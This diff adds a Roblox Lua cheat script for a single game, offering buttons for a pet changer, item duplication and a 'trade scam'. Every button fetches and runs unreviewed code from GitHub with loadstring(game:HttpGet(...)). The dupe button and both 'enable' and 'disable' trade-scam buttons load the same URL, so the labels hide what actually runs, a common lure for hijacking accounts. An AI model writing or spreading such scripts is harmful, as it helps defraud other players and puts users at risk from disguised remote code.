@@ -1,0 +1,74 @@
+if game.PlaceId == 6284583030 then
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "Ro-Scripts Hub", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+
+
+
+-- pet changer
+local VisualTab = Window:MakeTab({
+	Name = "Pet Changer",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = VisualTab:AddSection({
+	Name = "Pet Visual"
+})
+
+VisualTab:AddButton({
+	Name = "Activate Pet Changer!",
+	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/zesty0010/vol/main/Anti-Huge"))()
+      		print("button pressed")
+  	end    
+})
+
+
+
+
+-- dupe
+local DupeTab = Window:MakeTab({
+	Name = "Pet Changer",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = DupeTab:AddSection({
+	Name = "Dupe"
+})
+
+DupeTab:AddButton({
+	Name = "Start Dupe!",
+	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/PSXSCRIPTSROBLOX/h/main/h"))()
+      		print("button pressed")
+  	end    
+})
+
+
+
+
+-- trade scam
+local TradeTab = Window:MakeTab({
+	Name = "Trade Scam",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = TradeTab:AddSection({
+	Name = "Trade Scam"
+})
+
+TradeTab:AddButton({
+	Name = "Enable Trade Scam!",
+	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/PSXSCRIPTSROBLOX/h/main/h"))()
+      		print("button pressed")
+  	end    
+})
+
+TradeTab:AddButton({
+	Name = "Disable Trade Scam!",
+	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/PSXSCRIPTSROBLOX/h/main/h"))()
+      		print("button pressed")
+  	end    
+})
+
